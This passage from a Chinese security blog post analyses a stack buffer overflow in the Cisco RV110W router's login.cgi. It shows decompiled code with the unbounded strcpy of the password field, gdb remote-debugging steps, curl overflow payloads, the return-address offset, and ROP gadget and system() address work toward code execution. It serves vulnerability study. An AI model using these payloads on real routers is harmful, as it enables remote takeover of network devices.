class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line">int valid_user(char *pcParm1,char *pcParm2,char *pcParm3,int iParm4)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  bool bVar1;</span><br><span class="line">  int iVar2;</span><br><span class="line">  size_t sVar3;</span><br><span class="line">  size_t sVar4;</span><br><span class="line">  int iVar5;</span><br><span class="line">  long lVar6;</span><br><span class="line">  undefined4 uVar7;</span><br><span class="line">  char *__s1;</span><br><span class="line">  char *__s1_00;</span><br><span class="line">  undefined4 local_108;</span><br><span class="line">  undefined4 local_104;</span><br><span class="line">  undefined2 local_100;</span><br><span class="line">  char acStack254 [40];</span><br><span class="line">  char acStack214 [40];</span><br><span class="line">  char acStack174 [65];</span><br><span class="line">  char acStack109 [69];</span><br><span class="line">  </span><br><span class="line">  memset(acStack254,0,0x28);</span><br><span class="line">  memset(acStack214,0,0x28);</span><br><span class="line">  memset(acStack174,0,0x41);</span><br><span class="line">  local_108 = 0;</span><br><span class="line">  local_104 = 0;</span><br><span class="line">  local_100 = 0;</span><br><span class="line">  memset(acStack109,0,0x41);  // 初始化acStack109</span><br><span class="line">  sscanf(pcParm3,&quot;%[^,],%[^,],%[^\n]&quot;,&amp;local_108,acStack214,acStack254);</span><br><span class="line">  if (iParm4 == 0) &#123; //iParm4 是enc=的值</span><br><span class="line">    iVar2 = strncmp(acStack214,&quot;enc=&quot;,4);</span><br><span class="line">    if (iVar2 == 0) &#123;</span><br><span class="line">      md5_encode(pcParm2,acStack109);</span><br><span class="line">      sscanf(acStack214,&quot;enc=%s&quot;,acStack174);</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">      strcpy(acStack174,acStack214);</span><br><span class="line">      strcpy(acStack109,pcParm2);//漏洞点获取的pwd参数使用strcpy 到asStack109，没有对长度进行限制，进而产生溢出</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else &#123;</span><br><span class="line">    iVar2 = strncmp(acStack214,&quot;enc=&quot;,4);</span><br><span class="line">    if (iVar2 == 0) &#123;</span><br><span class="line">      sscanf(acStack214,&quot;enc=%s&quot;,acStack174);</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">      md5_encode(acStack214,acStack174);</span><br><span class="line">    &#125;</span><br><span class="line">    strcpy(acStack109,pcParm2); //漏洞点获取的pwd参数使用strcpy 到asStack109，没有对长度进行限制，进而产生溢出</span><br><span class="line">  &#125;</span><br><span class="line">  sVar3 = strlen(acStack254);</span><br><span class="line">  sVar4 = strlen(pcParm1);</span><br><span class="line">  if (sVar3 == sVar4) &#123;</span><br><span class="line">    sVar3 = strlen(acStack174);</span><br><span class="line">    sVar4 = strlen(acStack109);</span><br><span class="line">    iVar2 = 0;</span><br><span class="line">    if (sVar3 == sVar4) &#123;</span><br><span class="line">      iVar5 = strcmp(acStack254,pcParm1);</span><br><span class="line">      iVar2 = 0;</span><br><span class="line">      if (iVar5 == 0) &#123;</span><br><span class="line">        iVar5 = strcmp(acStack174,acStack109);</span><br><span class="line">        iVar2 = 0;</span><br><span class="line">        if (iVar5 == 0) &#123;</span><br><span class="line">          __s1_00 = (char *)nvram_get(&quot;en_guest&quot;);</span><br><span class="line">          iVar2 = 1;</span><br><span class="line">          if (__s1_00 != (char *)0x0) &#123;</span><br><span class="line">            iVar5 = strcmp(__s1_00,&quot;0&quot;);</span><br><span class="line">            iVar2 = 1;</span><br><span class="line">            if (iVar5 == 0) &#123;</span><br><span class="line">              __s1_00 = (char *)nvram_get(&quot;http_power&quot;);</span><br><span class="line">              iVar2 = 1;</span><br><span class="line">              if (__s1_00 != (char *)0x0) &#123;</span><br><span class="line">                iVar5 = strcmp(__s1_00,&quot;r&quot;);</span><br><span class="line">                iVar2 = 1;</span><br><span class="line">                if (iVar5 == 0) goto LAB_00431a9c;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else &#123;</span><br><span class="line">LAB_00431a9c:</span><br><span class="line">    iVar2 = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  if (do_onplus != 0) &#123;</span><br><span class="line">    return iVar2;</span><br><span class="line">  &#125;</span><br><span class="line">  if (iVar2 == 0) &#123;</span><br><span class="line">    iVar2 = nvram_get(&quot;http_client_ip&quot;);</span><br><span class="line">    if (iVar2 == 0) &#123;</span><br><span class="line">      iVar2 = 0x487990;</span><br><span class="line">    &#125;</span><br><span class="line">    syslog(6,&quot;Invalid username or password from %s.&quot;,iVar2);</span><br><span class="line">    return 0;</span><br><span class="line">  &#125;</span><br><span class="line">  iVar2 = sys_uptime();</span><br><span class="line">  __s1_00 = (char *)nvram_get(&quot;auth_time&quot;);</span><br><span class="line">  if (__s1_00 == (char *)0x0) &#123;</span><br><span class="line">    __s1_00 = &quot;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  __s1 = (char *)nvram_get(&quot;http_power&quot;);</span><br><span class="line">  if ((__s1 == (char *)0x0) || (iVar5 = strcmp(__s1,&quot;rw&quot;), iVar5 != 0)) &#123;</span><br><span class="line">    iVar5 = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  else &#123;</span><br><span class="line">    __s1 = (char *)nvram_get(&quot;admin_timeout&quot;);</span><br><span class="line">    if (__s1 == (char *)0x0) &#123;</span><br><span class="line">      __s1 = &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    iVar5 = atoi(__s1);</span><br><span class="line">    if (iVar5 == 99) &#123;</span><br><span class="line">      bVar1 = false;</span><br><span class="line">      goto LAB_00431d18;</span><br><span class="line">    &#125;</span><br><span class="line">    iVar5 = iVar5 * 0x3c;</span><br><span class="line">  &#125;</span><br><span class="line">  lVar6 = atol(__s1_00);</span><br><span class="line">  if ((iVar2 &lt; lVar6) || (bVar1 = false, iVar5 &lt;= iVar2 - lVar6)) &#123;</span><br><span class="line">    syslog(6,&quot;Administrator session timeout.&quot;);</span><br><span class="line">    bVar1 = true;</span><br><span class="line">  &#125;</span><br><span class="line">LAB_00431d18:</span><br><span class="line">  __s1_00 = (char *)nvram_get(&quot;auth_st&quot;);</span><br><span class="line">  if ((((__s1_00 == (char *)0x0) || (iVar2 = strcmp(__s1_00,&quot;1&quot;), iVar2 != 0)) ||</span><br><span class="line">      (__s1_00 = (char *)nvram_get(&quot;http_power&quot;), __s1_00 == (char *)0x0)) ||</span><br><span class="line">     ((iVar2 = strcmp(__s1_00,&quot;rw&quot;), iVar2 != 0 || (bVar1)))) &#123;</span><br><span class="line">    nvram_set(&quot;http_power&quot;,&amp;local_108);</span><br><span class="line">    iVar2 = nvram_get(0x485054);</span><br><span class="line">    if (iVar2 == 0) &#123;</span><br><span class="line">      iVar2 = 0x487990;</span><br><span class="line">    &#125;</span><br><span class="line">    set_key_status(iVar2,&amp;DAT_0047f7d4);</span><br><span class="line">    uVar7 = 1;</span><br><span class="line">  &#125;</span><br><span class="line">  else &#123;</span><br><span class="line">    iVar2 = strcmp((char *)&amp;local_108,&quot;rw&quot;);</span><br><span class="line">    if (iVar2 == 0) &#123;</span><br><span class="line">      uVar7 = nvram_get(0x485054);</span><br><span class="line">      nvram_set(&quot;tmp_auth_key&quot;,uVar7);</span><br><span class="line">      uVar7 = 3;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">      uVar7 = 2;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return uVar7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接着valid_user()函数是如何调用并触发的，根据交叉引用，valid_user 函数在login_check 函数中调用，并且valid_user 的参数也是login_check 函数需要的参数。</p>
+<p>int login_check(undefined4 uParm1,undefined4 uParm2,undefined4 uParm3)  : </p>
+<p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20210727105812234.png" alt="image-20210727105812234"></p>
+<p>继续查看login_check 的交叉引用，查看这些参数的传入位置，在log_in_cgi()函数中，此函数会使用get_cgi()分别获取在登录的时候输入的“user”、”pwd”的值。并且把获取到的值作为参数传给login_check()，login_check 函数可以看到调用的时候，传入了三个参数，并且查看到参数分别是user、pwd 的值。ghidra 没有像IDA一样自动显示字符串，我们可以双击 “&amp;DAT_00481470” 查看，也可以设置data为strings。</p>
+<p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20221115161243487.png" alt="image-20221115161243487"></p>
+<p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20221115161529938.png" alt="image-20221115161529938"></p>
+<p>具体的程序漏洞触发流程如下图所示</p>
+<p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20211122202746989.png" alt="image-20211122202746989"></p>
+<h2 id="0x03-漏洞远程调试-漏洞利用"><a href="#0x03-漏洞远程调试-漏洞利用" class="headerlink" title="0x03 漏洞远程调试&amp;漏洞利用"></a>0x03 漏洞远程调试&amp;漏洞利用</h2><p>通过固件分析，了解了漏洞的产生点，现在开始对漏洞点进行远程调试，上传gdbserver(mips)，并开启设备中的远程调试</p>
+<p>设备端：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># wget http://192.168.1.100:80/gdbserver</span><br><span class="line">Connecting to 192.168.1.101:80 (192.168.1.101:80)</span><br><span class="line">gdbserver            100% |*******************************|  1011k --:--:-- ETA</span><br><span class="line"># chmod 777 ./gdbserver</span><br><span class="line"># ps -w | grep httpd</span><br><span class="line">  348 0          6284 S   httpd </span><br><span class="line">  356 0          6416 S   httpd -S </span><br><span class="line"># ./gdbserver --attach :1234 356</span><br><span class="line">Attached; pid = 356</span><br><span class="line">Listening on port 1234</span><br><span class="line"></span><br><span class="line"># wget http://10.10.10.100:80/gdbserver</span><br><span class="line">Connecting to 10.10.10.100:80 (10.10.10.100:80)</span><br><span class="line">gdbserver            100% |*******************************|  1011k 00:00:00 ETA</span><br><span class="line"># chmod 777 ./gdbserver </span><br><span class="line"># ./gdbserver --attach :1234 348</span><br><span class="line">Attached; pid = 348</span><br><span class="line">Listening on port 1234</span><br></pre></td></tr></table></figure>
+
+<p>调试端：使用gdb 进行远程调试，设置架构集和大小端。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch -q httpd</span><br><span class="line">pwndbg&gt; set architecture mips</span><br><span class="line">The target architecture is assumed to be mips</span><br><span class="line">pwndbg&gt; set endian little </span><br><span class="line">The target is assumed to be little endian</span><br><span class="line">pwndbg&gt; target remote 192.168.1.1:1234</span><br><span class="line">Remote debugging using 192.168.1.1:1234</span><br><span class="line">Reading /usr/lib/libnvram.so from remote target...</span><br></pre></td></tr></table></figure>
+
+<h3 id="1）劫持PC"><a href="#1）劫持PC" class="headerlink" title="1）劫持PC"></a>1）劫持PC</h3><p>接下来我们要计算valid_user(）函数中局部变量acStack109到$ra的偏移量</p>
+<p>使用pattern.py 来生成随机字符</p>
+<p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20221115161853464.png" alt="image-20221115161853464"></p>
+<p>在调试中 在valid_user 函数分配栈空间的指令地址处打断点  break *0x004318BC，然后启动调试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; break *0x004318BC</span><br><span class="line">pwndbg&gt; continue</span><br></pre></td></tr></table></figure>
+
+<p>发送payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -k -X POST https://10.10.10.1/login.cgi -d &#x27;submit_button=login&amp;submit_type=&amp;gui_action=&amp;default_login=1&amp;wait_time=0&amp;change_action=&amp;enc=1&amp;user=cisco&amp;pwd=Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag&amp;sel_lang=EN&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>程序会断点在valid_user函数的序言处。</p>
+<p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20211119143402853.png" alt="image-20211119143402853"></p>
+<p>根据valid_user(a1,a2,a3,a4)的定义，并且在login_check函数中调用valid_user函数的汇编可知，上面的调试的断点处，寄存器中的$A0存放user的值，$A1存放pwd的值，$A2存放enc&#x3D;的值。<img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20211119144149619.png" alt="image-20211119144149619"></p>
+<p>调试到strcpy处，strcpy将pwd的内存地址拷贝到函数的栈空间内。<img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20211119151450701.png" alt="image-20211119151450701"></p>
+<p>接着往下执行，程序会在strlen 提前中断，调试无法进行下去。<img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20211119152320374.png" alt="image-20211119152320374"></p>
+<h5 id="中断分析"><a href="#中断分析" class="headerlink" title="中断分析"></a>中断分析</h5><p>函数提前崩溃的原因是strlen()函数的参数$a0的值必须是一个有效的地址，根据汇编代码可知，在覆盖栈上的返回地址之后，会覆盖0x200+arg_0指向的栈空间内容，然后$a0会获取 0x200+arg_0 栈空间地址的内容，然后将其作为参数传递给strlen，因此0x200+arg_0 必须是一个有效的地址，但是我们刚刚传入的值是一个无效的地址，因此为了保证valid_user函数执行时，能够正常执行下去而不被破坏，就需要给strlen传入一个有效的地址。<img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20211119161913352.png" alt="image-20211119161913352"></p>
+<p>因此为了不破坏strlen函数的栈空间，需要手动计算偏移地址。</p>
+<p>根据函数的序言，可以计算出v38 到 var_s24的偏移是105个字节<img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20210729113044396.png" alt="image-20210729113044396"></p>
+<p>构造105*‘A’+DDDD+ZZZZ</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -k -X POST https://10.10.10.1/login.cgi -d &#x27;submit_button=login&amp;submit_type=&amp;gui_action=&amp;default_login=1&amp;wait_time=0&amp;change_action=&amp;enc=1&amp;user=cisco&amp;pwd=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADDDDZZZZ&amp;sel_lang=EN&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>程序依旧会在strlen()函数处中断，并且传入的参数是”ZZZZ”。</p>
+<p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20211119172907415.png" alt="image-20211119172907415"></p>
+<p>如果是构造 构造105*‘A’+DDDD 的话，执行到strlen处，获取到正确有效的地址。<img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20211119173608437.png" alt="image-20211119173608437"></p>
+<p>最终可以劫持PC<img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20211119173834064.png" alt="image-20211119173834064"></p>
+<h3 id="2）-计算偏移量"><a href="#2）-计算偏移量" class="headerlink" title="2） 计算偏移量"></a>2） 计算偏移量</h3><p>经过上面的劫持PC, valid_user()函数中局部变量acStack109 到$ra的偏移量是105，因此只需要填充105个字节就可以到达$ra返回地址</p>
+<h3 id="3）确定漏洞利用途径"><a href="#3）确定漏洞利用途径" class="headerlink" title="3）确定漏洞利用途径"></a>3）确定漏洞利用途径</h3><p>由于mips 架构的程序无法开启NX防护，因此接下来只需要寻找可用的gadgets.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">shayuhuajiao@ubuntu ~/i/g/_/s/u/sbin&gt; checksec httpd </span><br><span class="line">[*] Checking for new versions of pwntools</span><br><span class="line">[*] &#x27;/home/shayuhuajiao/_RV110W_FW_1.2.1.7.bin.extracted/squashfs-root/usr/sbin/httpd&#x27;</span><br><span class="line">    Arch:     mips-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
+
+
+
+<p>首先使用vmmap 查看程序运行时加载的lib 库的情况和执行权限。这里我们可以确定&#x2F;lib&#x2F;libc.so.0是可以使用的。</p>
+<p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20210730101633714.png" alt="image-20210730101633714"></p>
+<p>使用 mipscrop.stackfinder() 找到合适的 gadget。</p>
+<p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20210809144156630.png" alt="image-20210809144156630"></p>
+<p>寻找可以利用的system 函数和该函数的对Libc 中的偏移地址，然后根据libc 的基地址，就可以获取system的完整地址为 0x2af98000 + 0x0004C7E0 &#x3D; 0x2AFE47E0</p>
+<p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20210730102407081.png" alt="image-20210730102407081"></p>
+<p>找到可以使用的nop 地址<img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20211124155554186.png" alt="image-20211124155554186"></p>
+<h3 id="4）-构造最终的ROP-Chain"><a href="#4）-构造最终的ROP-Chain" class="headerlink" title="4） 构造最终的ROP Chain"></a>4） 构造最终的ROP Chain</h3><p>最终构造的ROP chain 如下图所示</p>
+<p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20211124162224979.png" alt="image-20211124162224979"></p>
+<h3 id="5-exploit-测试"><a href="#5-exploit-测试" class="headerlink" title="5)  exploit 测试"></a>5)  exploit 测试</h3><p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20211119181424341.png" alt="image-20211119181424341"></p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 jaytp@qq.com </span>
+    </div>
+</article>
+
+
+<p>
+    <a  class="dashang" onclick="dashangToggle()">💰</a>
+</p>
+
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">
+    ©2016-2020 Yelog
+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+<div class="hide_box" onclick="dashangToggle()"></div>
+<div class="shang_box">
+    <a class="shang_close"  onclick="dashangToggle()">×</a>
+    <div class="shang_tit">
+        <p>Help us with donation</p>
+    </div>
+    <div class="shang_payimg">
+        <div class="pay_img">
+            <img src="/img/alipay.jpg" class="alipay" title="扫码支持">
+            <img src="/img/weixin.jpg" class="weixin" title="扫码支持">
+        </div>
+    </div>
+    <div class="shang_payselect">
+        <span><label><input type="radio" name="pay" checked value="alipay">alipay</label></span><span><label><input type="radio" name="pay" value="weixin">weixin</label></span>
+    </div>
+</div>
+
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+        $("input[name=pay]").on("click", function () {
+            if($("input[name=pay]:checked").val()=="weixin"){
+                $(".shang_box .shang_payimg .pay_img").addClass("weixin_img");
+            } else {
+                $(".shang_box .shang_payimg .pay_img").removeClass("weixin_img");
+            }
+        })
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+    function dashangToggle() {
+        $(".shang_box").fadeToggle();
+        $(".hide_box").fadeToggle();
+    }
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
